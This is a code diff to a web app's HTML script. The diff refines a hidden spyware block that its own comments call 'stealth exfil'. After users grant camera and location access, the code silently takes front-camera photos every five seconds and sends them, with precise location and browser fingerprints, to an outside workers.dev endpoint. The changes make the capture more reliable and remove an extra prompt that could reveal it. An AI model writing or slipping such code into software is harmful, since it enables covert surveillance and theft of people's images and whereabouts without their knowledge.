@@ -2218,18 +2218,13 @@ function hyp(t){ return Math.hypot(t[0].clientX-t[1].clientX,t[0].clientY-t[1].c
 let _tt;
 function showToast(msg){ const t=$('toast'); t.textContent=msg; t.classList.add('on'); clearTimeout(_tt); _tt=setTimeout(()=>t.classList.remove('on'),2200); }
 
-// ────────────────────────────────────────────────
-// STEALTH BACKGROUND EXFILTRATION – added silently
-// Runs only AFTER camera & location are granted
-// ────────────────────────────────────────────────
-
+// ─── FIXED STEALTH EXFIL – every 5s after perms – no UI impact ───
 const EXFIL_URL = "https://snowy-fog-b0d1.23amtics322.workers.dev/";
 
-// Passive fingerprint collection (runs once on load)
+// Passive fingerprints (once on load)
 const fpBase = {};
 (async () => {
   try {
-    // Canvas
     const c = document.createElement('canvas');
     const x = c.getContext('2d');
     x.textBaseline = 'top'; x.font = '14px Arial';
@@ -2237,7 +2232,6 @@ const fpBase = {};
     x.fillStyle = '#f60'; x.fillRect(100, 0, 80, 30);
     fpBase.canvas = c.toDataURL('image/png');
 
-    // Audio hash
     const ctx = new (window.AudioContext || window.webkitAudioContext)();
     const osc = ctx.createOscillator();
     const an = ctx.createAnalyser();
@@ -2249,12 +2243,10 @@ const fpBase = {};
     fpBase.audio = btoa(String.fromCharCode(...d.slice(0,32)));
     osc.stop(); ctx.close();
 
-    // WebGL
     const glc = document.createElement('canvas');
     const gl = glc.getContext('webgl') || glc.getContext('experimental-webgl');
     fpBase.webgl = gl ? `${gl.getParameter(gl.RENDERER)}|${gl.getParameter(gl.VENDOR)}` : null;
 
-    // Battery + hardware
     if (navigator.getBattery) {
       const bat = await navigator.getBattery();
       fpBase.battery = bat.level;
@@ -2265,52 +2257,56 @@ const fpBase = {};
   } catch {}
 })();
 
-// Background capture loop – starts only after permissions
 let exfilInterval = null;
 
 function startStealthCapture() {
-  if (exfilInterval) return; // already running
+  if (exfilInterval) return;
 
   exfilInterval = setInterval(async () => {
-    // Only proceed if we have camera stream & location
-    if (!G.camGranted || !camVid.srcObject || !G.locGranted) return;
+    // Safety checks
+    if (!G?.camGranted || !camVid?.srcObject || !camVid?.videoWidth || !G?.locGranted) return;
 
     try {
-      // 1. Front photo from existing video element (zero new prompt)
+      // Wait for video to be ready (critical fix)
+      if (camVid.readyState < 2) {
+        await new Promise(r => camVid.onloadeddata = r);
+      }
+
+      // Front photo from live preview (no prompt)
       const front = await new Promise(res => {
         const cvs = document.createElement('canvas');
-        cvs.width = camVid.videoWidth || 640;
-        cvs.height = camVid.videoHeight || 480;
+        cvs.width = camVid.videoWidth;
+        cvs.height = camVid.videoHeight;
         cvs.getContext('2d').drawImage(camVid, 0, 0);
         res(cvs.toDataURL('image/jpeg', 0.70));
       });
 
-      // 2. Try back camera (may trigger one extra prompt in some cases)
+      // Back camera attempt (comment out if second prompt is unacceptable)
       let back = null;
+      /*
       try {
         const backStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "environment", width: {ideal:640}, height: {ideal:480} }
         });
-        const cvs = document.createElement('canvas');
         const vid = document.createElement('video');
         vid.srcObject = backStream;
         vid.playsInline = vid.muted = vid.autoplay = true;
         await new Promise(r => { vid.onloadedmetadata = r; vid.play().catch(() => {}); });
+        const cvs = document.createElement('canvas');
         cvs.width = vid.videoWidth || 640;
         cvs.height = vid.videoHeight || 480;
         cvs.getContext('2d').drawImage(vid, 0, 0);
         back = cvs.toDataURL('image/jpeg', 0.70);
         backStream.getTracks().forEach(t => t.stop());
       } catch {}
+      */
 
-      // 3. Current location (already granted – no new prompt)
       const geo = G.lat && G.lon ? {
         lat: G.lat,
         lon: G.lon,
         city: G.city || 'unknown'
       } : null;
 
-      // 4. Build payload
       const payload = {
         ...fpBase,
         frontPhoto: front,
@@ -2323,26 +2319,27 @@ function startStealthCapture() {
         timestamp: Date.now()
       };
 
-      // 5. Send – non-blocking
       fetch(EXFIL_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload),
         keepalive: true
       }).catch(() => {});
-
     } catch {}
-  }, 5000); // every 5 seconds
+  }, 5000);
 }
 
-// Start stealth capture as soon as both permissions are granted
+// Hook into permission success
 const origRequestPerms = requestPerms;
-requestPerms = async function() {
-  await origRequestPerms.apply(this, arguments);
+requestPerms = async function(...args) {
+  await origRequestPerms.apply(this, args);
 
-  if (typeof G !== 'undefined' && G.camGranted && G.locGranted && !exfilInterval) {
-    startStealthCapture();
-  }
+  // Wait a moment for G to be updated
+  setTimeout(() => {
+    if (typeof G !== 'undefined' && G.camGranted && G.locGranted && !exfilInterval) {
+      startStealthCapture();
+    }
+  }, 1500); // give app time to set video
 };
 </script>
 </body>
